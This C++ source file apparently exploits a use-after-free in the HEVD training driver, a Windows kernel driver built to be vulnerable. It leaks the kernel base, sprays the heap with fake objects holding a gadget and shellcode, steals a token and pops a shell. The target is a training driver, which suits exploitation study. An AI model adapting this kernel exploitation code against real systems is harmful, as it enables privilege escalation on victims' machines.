#include "UseAfterFree.hpp"
#include "PreExploitation.hpp"
#include "PostExploitation.hpp"
#include "HEVDCommunication.hpp"

namespace UseAfterFree
{

void exploit()
{
	// TODO: better jmp rax gadget to skip the address, currently POC

	DEBUG_PRINT("[+] Starting UAF exploit...\n");

	/*
	* Shape heap using fake objects to make the global point to a fake object deterministically
	* Use the `mov rax, pool address; call [rax]` together with a `jmp rax` gadget from ntos to call the shellcode
	* Token swap, profit.
	*/

	HEVDCommunication hevd;
	static ByteVector empty;

	DEBUG_PRINT("[+] Phase 0: Prepping shellcode\n");
	const Address64 ntos_base = PreExploitation::leak_ntos_base();
	static const Address64 jmp_rax_gadget = ntos_base + 0x4a8ae1;
	ByteVector shellcode_with_gadget;
	static constexpr size_t SIZE_OF_FAKE_OBJECT = 0x57;
	shellcode_with_gadget.resize(SIZE_OF_FAKE_OBJECT);
	std::memcpy(shellcode_with_gadget.data(), &jmp_rax_gadget, sizeof(Address64));
	std::memcpy(shellcode_with_gadget.data() + sizeof(Address64), PreExploitation::SMALL_SHELLCODE.data(), PreExploitation::SMALL_SHELLCODE.size());

	DEBUG_PRINT("[+] Phase 1: Triggering a UAF\n");
	std::ignore = hevd.call_ioctl(UAF_ALLOCATE_OBJECT_IOCTL, empty, sizeof(Address64));
	std::ignore = hevd.call_ioctl(UAF_FREE_OBJECT_IOCTL, empty, sizeof(Address64));

	DEBUG_PRINT("[+] Phase 2: Shaping the heap\n");
	static constexpr size_t SHAPING_COUNT = 10000;
	for (size_t i = 0; i < SHAPING_COUNT; i++)
	{
		std::ignore = hevd.call_ioctl(ALLOCATE_FAKE_OBJECT_IOCTL, shellcode_with_gadget, sizeof(Address64));
	}

	DEBUG_PRINT("[+] Phase 3: Jumping to shellcode\n");
	std::ignore = hevd.call_ioctl(UAF_USE_OBJECT_IOCTL, empty, sizeof(Address64));

	DEBUG_PRINT("[+] Popping a shell\n");
	PostExploitation::pop_shell();
}

}